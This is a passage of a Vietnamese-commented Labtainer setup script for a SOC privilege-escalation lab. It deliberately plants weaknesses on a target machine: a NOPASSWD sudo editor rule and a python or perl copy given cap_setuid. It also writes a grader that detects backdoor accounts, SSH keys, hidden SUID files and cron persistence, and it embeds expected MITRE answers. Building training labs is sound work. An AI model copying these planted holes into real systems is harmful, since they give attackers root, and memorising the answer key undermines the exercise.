 'deploy ALL=(root) NOPASSWD: $SC restart nginx, $SC restart cron' > /etc/sudoers.d/deploy; \
 printf '%s\n' 'deploy ALL=(root) NOPASSWD: $ED' >> /etc/sudoers.d/deploy; chmod 440 /etc/sudoers.d/deploy"
echo "$PW" | sudo -S useradd -m -s /bin/bash adminops 2>/dev/null

# ============ 10) H1 = trinh thong dich mang capability cap_setuid (leo root khong can SUID/sudo) ============
case "HVAR" in 1) SRC=$(readlink -f "$(command -v python3)"); DST=/usr/local/bin/py-report ;;
                *) SRC=$(readlink -f "$(command -v perl)");    DST=/usr/local/bin/perl-report ;; esac
echo "$PW" | sudo -S cp "$SRC" "$DST" && echo "$PW" | sudo -S chmod 755 "$DST"
echo "$PW" | sudo -S setcap cap_setuid+ep "$DST" 2>/dev/null

# ============ 11) sshd: dang nhap bang key phai bat (giai doan 6). GIU PermitRootLogin mac dinh (H3) ============
echo "$PW" | sudo -S sed -i 's/^#\?PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config 2>/dev/null
echo "$PW" | sudo -S service ssh restart 2>/dev/null || echo "$PW" | sudo -S systemctl restart ssh 2>/dev/null || true

# ============ 12) Nhieu lanh dinh ky (nhan vien go nham, deploy dung sudo, admin dang nhap root tu may quan tri) ============
echo "$PW" | sudo -S install -m 755 /home/ubuntu/ops-noise.sh /usr/local/sbin/ops-healthcheck.sh
echo "$PW" | sudo -S bash -c "echo '*/3 * * * * root /usr/local/sbin/ops-healthcheck.sh >/dev/null 2>&1' > /etc/cron.d/ops-healthcheck; chmod 644 /etc/cron.d/ops-healthcheck"

# ============ 13) Mo rong phieu dieu tra (GIU nguyen cac khoa goc o tren) ============
cat > /tmp/findings-ext.txt <<'FND'
# ===================== MO RONG (Bai 17) =====================
# -- Timeline mo rong (HH:MM, khop gio that trong auth.log / SIEM, dung sai +-1 phut) --
TIME_SPRAY=
TIME_DISCOVERY=
TIME_CRED=
TIME_REENTRY=
# -- So tai khoan KHAC NHAU bi thu trong dot do mat khau (TINH CA tai khoan bi chiem) --
SO_TAI_KHOAN_BI_DO=
# -- MITRE: so hieu ky thuat chinh cua tung giai doan (vd T1059 -> 1059) --
MITRE_SPRAY=
MITRE_ESCALATION=
MITRE_CRED=
MITRE_PERSIST=
MITRE_REENTRY=
# -- BAN DO PHU: voi bo luat NGUYEN TRANG, giai doan co canh bao level >= 10 khong? (1 = co, 0 = khong)
#    0=do mat khau 1=truy cap 2=trinh sat 3=leo thang 4=thu thap 5=duy tri 6=quay lai
COVER_0=
COVER_1=
COVER_2=
COVER_3=
COVER_4=
COVER_5=
COVER_6=
FND
echo "$PW" | sudo -S bash -c "cat /tmp/findings-ext.txt >> /home/analyst/findings.txt; rm -f /tmp/findings-ext.txt"

exit 0
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/target/_bin"
cat > "$LAB/target/_bin/prestop" <<'__EOF_LAB_SOC_PRIVESC__'
#!/bin/bash
# Chup trang thai target luc checkwork/stoplab -> prestop.stdout (cham diem IR).
# QUAN TRONG: chi in CO (presence flag) / OK, KHONG in ten tai khoan ca nhan hoa, IOC,
# hay gio that -> tranh sinh vien doc prestop.stdout de chep dap an.
trap "echo Timed out; exit" SIGTERM

# Chi giu DUY NHAT ban chup moi nhat (tranh grader doc nham ban cu truoc khi co su co).
ls -t /home/ubuntu/.local/result/prestop.stdout.* 2>/dev/null | tail -n +2 | xargs -r rm -f 2>/dev/null

echo "PRESTOP_MARKER"

# Ground-truth (ten ca nhan hoa + gio that) - chi root doc, KHONG in ra
TACCT=$(sudo -n grep '^ACCT=' /root/.soc_truth 2>/dev/null | cut -d= -f2)
TBD=$(sudo -n grep '^BACKDOOR=' /root/.soc_truth 2>/dev/null | cut -d= -f2)

# ================= HIEN TRANG MAY (cham eradication/containment) =================
# --- Leo quyen 1: /usr/bin/find con SUID? ---
# (sua loi: stat %a cua file thuong la 3 chu so, vd 755 -> mau 7* bat nham; dung test -u/-g)
{ [ -u /usr/bin/find ] || [ -g /usr/bin/find ]; } && echo "SUID_VULN_PRESENT"
# --- Leo quyen 2: con sudo NOPASSWD cho tai khoan bi chiem? ---
sudo -n grep -rhiE 'NOPASSWD' /etc/sudoers /etc/sudoers.d 2>/dev/null | grep -qi "$TACCT" && echo "SUDO_VULN_PRESENT"
# --- Persistence lop 1: con tai khoan UID 0 la (backdoor)? ---
awk -F: '($3==0 && $1!="root"){f=1} END{if(f) print "UID0USER_PRESENT"}' /etc/passwd 2>/dev/null
# --- Persistence lop 2: SSH key la trong /root/.ssh/authorized_keys? ---
sudo -n grep -q 'backdoor@attacker' /root/.ssh/authorized_keys 2>/dev/null && echo "SSHKEY_PRESENT"
# --- Persistence lop 3: SUID backdoor an? ---
{ [ -u /usr/local/bin/.dbus-cache ] || [ -g /usr/local/bin/.dbus-cache ]; } && echo "SUIDBD_PRESENT"
# --- Persistence lop 4: cronjob doc? ---
[ -f /etc/cron.d/sysbackup ] && echo "CRONBD_PRESENT"
# --- Foothold: tai khoan bi chiem con dang nhap duoc? (shadow chua bi khoa) ---
SH=$(sudo -n grep "^$TACCT:" /etc/shadow 2>/dev/null | cut -d: -f2)
case "$SH" in ""|"!"*|"*"*) : ;; *) echo "FOOTHOLD_OPEN";; esac
# --- Containment: da chan IP ke tan cong bang iptables chua? ---
sudo -n iptables -S 2>/dev/null | grep -qE '172\.20\.0\.5(/32)?.*-j (DROP|REJECT)' && echo "CONTAINED"

# ================= BAO CAO IOC CUA ANALYST (so khop ground-truth, chi in OK) =================
F=/home/analyst/findings.txt
# VECTOR1 phai neu DUNG co che: 'find' VA dau hieu SUID (suid/4000/u+s)
V1=$(grep -i '^VECTOR1=' "$F" 2>/dev/null)
echo "$V1" | grep -qi 'find' && echo "$V1" | grep -qiE 'suid|4000|u\+s|u\-s' && echo "REP_V1_OK"
# VECTOR2 phai neu DUNG co che: 'awk' VA 'sudo'
V2=$(grep -i '^VECTOR2=' "$F" 2>/dev/null)
echo "$V2" | grep -qi 'awk' && echo "$V2" | grep -qi 'sudo' && echo "REP_V2_OK"
# Tai khoan + backdoor: khop ground-truth ca nhan hoa (chong chep)
[ -n "$TACCT" ] && grep '^COMPROMISED=' "$F" 2>/dev/null | grep -q "$TACCT" && echo "REP_ACCT_OK"
[ -n "$TBD" ]   && grep '^BACKDOOR='    "$F" 2>/dev/null | grep -q "$TBD"   && echo "REP_BD_OK"
grep '^IP_KE_TAN_CONG=' "$F" 2>/dev/null | grep -q '172.20.0.5' && echo "REP_IP_OK"

# ================= TIMELINE (A2): so khop GIO THUC TE trong auth.log (dung sai +-1 phut) =================
AL=/var/log/auth.log
gt_time(){ sudo -n grep -aE "$1" "$AL" 2>/dev/null | grep -oE '[0-9]{2}:[0-9]{2}:[0-9]{2}' | head -1 | cut -c1-5; }
GT_A=$(gt_time "Accepted .*for $TACCT .*172\.20\.0\.5")
GT_E=$(gt_time "sudo:.*$TACCT .*COMMAND=/usr/bin/awk")
GT_P=$(gt_time "new user: name=$TBD")
A=$(grep '^TIME_ACCESS='     "$F" 2>/dev/null | cut -d= -f2- | tr -d ' ')
E=$(grep '^TIME_ESCALATION=' "$F" 2>/dev/null | cut -d= -f2- | tr -d ' ')
P=$(grep '^TIME_PERSIST='    "$F" 2>/dev/null | cut -d= -f2- | tr -d ' ')
to_min(){ local hh=${1%%:*} mm=${1##*:}; case "$hh$mm" in ""|*[!0-9]*) return 1;; esac; echo $((10#$hh*60 + 10#$mm)); }
close(){ local s g d; s=$(to_min "$1") || return 1; g=$(to_min "$2") || return 1; d=$(( s>g ? s-g : g-s )); [ "$d" -le 1 ]; }
close "$A" "$GT_A" && echo "TIME_ACCESS_OK"
close "$E" "$GT_E" && echo "TIME_ESC_OK"
close "$P" "$GT_P" && echo "TIME_PERSIST_OK"
# Timeline dat khi CA 3 moc khop gio that VA dung thu tu (access <= escalation <= persist)
if close "$A" "$GT_A" && close "$E" "$GT_E" && close "$P" "$GT_P"; then
  am=$(to_min "$A"); em=$(to_min "$E"); pm=$(to_min "$P")
  [ "$am" -le "$em" ] && [ "$em" -le "$pm" ] && echo "TIMELINE_OK"
fi

# ######################################################################################
# ===================== BAI 17 - KHOI CHAM MO RONG (noi them, khong sua khoi goc) =====================
# Van chi in CO/OK - khong in ten, gio, ten file.
# ######################################################################################
gt(){ sudo -n grep "^$1=" /root/.soc_truth 2>/dev/null | head -1 | cut -d= -f2-; }
fv(){ grep "^$1=" "$F" 2>/dev/null | head -1 | cut -d= -f2- | tr -d ' \r'; }
N_SPRAY=$(gt N_SPRAY); CRED_FILE=$(gt CRED_FILE); CRED_TIME=$(gt CRED_TIME)

# ---- 4 moc moi (gio that) ----
GT_S=$(gt_time "Failed password for .* from 172\.20\.0\.5 ")
GT_D=$(gt_time "sudo: *$TACCT : .*COMMAND=list")
GT_C="$CRED_TIME"
GT_R=$(gt_time "Accepted publickey for root from 172\.20\.0\.5 ")
S=$(fv TIME_SPRAY); D=$(fv TIME_DISCOVERY); C=$(fv TIME_CRED); RE=$(fv TIME_REENTRY)
n=0
close "$A" "$GT_A" && n=$((n+1))
close "$E" "$GT_E" && n=$((n+1))
close "$P" "$GT_P" && n=$((n+1))
close "$S" "$GT_S" && { n=$((n+1)); echo "TIME_SPRAY_OK"; }
close "$D" "$GT_D" && { n=$((n+1)); echo "TIME_DISC_OK"; }
close "$C" "$GT_C" && { n=$((n+1)); echo "TIME_CRED_OK"; }
close "$RE" "$GT_R" && { n=$((n+1)); echo "TIME_REENTRY_OK"; }
# Thu tu: cac moc DA DIEN phai khong giam theo dung trinh tu tan cong
ord_ok=1; prev=-1
for v in "$S" "$A" "$D" "$E" "$C" "$P" "$RE"; do
  m=$(to_min "$v") || continue
  [ "$m" -lt "$prev" ] && ord_ok=0
  prev=$m
done
[ "$n" -ge 6 ] && [ "$ord_ok" -eq 1 ] && echo "TIMELINE_FULL_OK"

# ---- Pham vi dot do mat khau ----
[ -n "$N_SPRAY" ] && [ "$(fv SO_TAI_KHOAN_BI_DO)" = "$N_SPRAY" ] && echo "SPRAY_N_OK"

# ---- MITRE (chap nhan T1110 / 1110 / T1110.003) ----
mnorm(){ echo "$1" | tr 'a-z' 'A-Z' | sed 's/^T//; s/\..*//' | tr -dc '0-9'; }
mc=0
[ "$(mnorm "$(fv MITRE_SPRAY)")" = "1110" ]      && mc=$((mc+1))
[ "$(mnorm "$(fv MITRE_ESCALATION)")" = "1548" ] && mc=$((mc+1))
[ "$(mnorm "$(fv MITRE_CRED)")" = "1003" ]       && mc=$((mc+1))
[ "$(mnorm "$(fv MITRE_PERSIST)")" = "1136" ]    && mc=$((mc+1))
[ "$(mnorm "$(fv MITRE_REENTRY)")" = "1021" ]    && mc=$((mc+1))
[ "$mc" -ge 4 ] && echo "MITRE_OK"

# ---- Ban do phu (y do thiet ke; siem xac nhan bang COVER_DESIGN_OK) ----
cc=0; i=0
for want in 0 0 0 0 0 1 0; do
  [ "$(fv COVER_$i)" = "$want" ] && cc=$((cc+1)); i=$((i+1))
done
[ "$cc" -ge 6 ] && echo "COVER_OK"

# ---- Hardening ----
getcap -r /usr/local/bin /usr/local/sbin /usr/bin /usr/sbin /bin /sbin /opt 2>/dev/null | grep -q 'cap_setuid' \
  || echo "HARDEN_CAP_OK"
DEPL=$(sudo -n grep -rhv '^[[:space:]]*#' /etc/sudoers /etc/sudoers.d 2>/dev/null | grep -E '^[[:space:]]*deploy[[:space:]]')
echo "$DEPL" | grep -qE '(/|[[:space:]])(vim|vi|vim\.tiny|nano|less|more|view)([[:space:],]|$)' || echo "HARDEN_SUDO_OK"
echo "$DEPL" | grep -q 'restart nginx' && echo "$DEPL" | grep -q 'restart cron' && echo "DEPLOY_SUDO_INTACT"
sudo -n /usr/sbin/sshd -T 2>/dev/null | grep -qi '^permitrootlogin no' && echo "HARDEN_SSH_OK"

# ---- Tao tac ke tan cong de lai (ban chep /etc/shadow) ----
[ -n "$CRED_FILE" ] && [ -e "$CRED_FILE" ] && echo "SHADOW_COPY_PRESENT"
[ -n "$CRED_FILE" ] && echo "CRED_GT_PRESENT"

exit 0
__EOF_LAB_SOC_PRIVESC__
mkdir -p "$LAB/target/_bin"
cat > "$LAB/target/_bin/treataslocal" <<'__EOF_LAB_SOC_PRIVESC__'
wazuh-agent
sudo
iptables
iptables-save
__EOF_LAB_SOC_PRIVESC__
echo ">> Cap quyen thuc thi + chuan hoa EOL (LF)"
chmod +x "$LAB/attacker/attack.sh"
chmod +x "$LAB/attacker/plant.sh"
chmod +x "$LAB/attacker/_bin/fixlocal.sh"
chmod +x "$LAB/defender/_bin/fixlocal.sh"
chmod +x "$LAB/defender/_bin/prestop"
chmod +x "$LAB/defender/_bin/student_startup.sh"
chmod +x "$LAB/defender/soc-tools/goi-y"
chmod +x "$LAB/defender/soc-tools/kiem-thu-luat"
chmod +x "$LAB/defender/soc-tools/thu-dong"
chmod +x "$LAB/siem/_bin/fixlocal.sh"
chmod +x "$LAB/siem/_bin/prestop"
chmod +x "$LAB/siem/bai17/gen17.py"
chmod +x "$LAB/siem/bai17/grade17.py"
chmod +x "$LAB/siem/bai17/seed17.py"
chmod +x "$LAB/target/ops-noise.sh"
chmod +x "$LAB/target/_bin/fixlocal.sh"
chmod +x "$LAB/target/_bin/prestop"
chmod +x "$LAB/target/_bin/treataslocal"
find "$LAB" -type f -exec sed -i 's/\r$//' {} +
echo ">> XONG. Tiep theo:  cd \$LABTAINER_DIR/scripts/labtainer-student && rebuild soc-privesc"
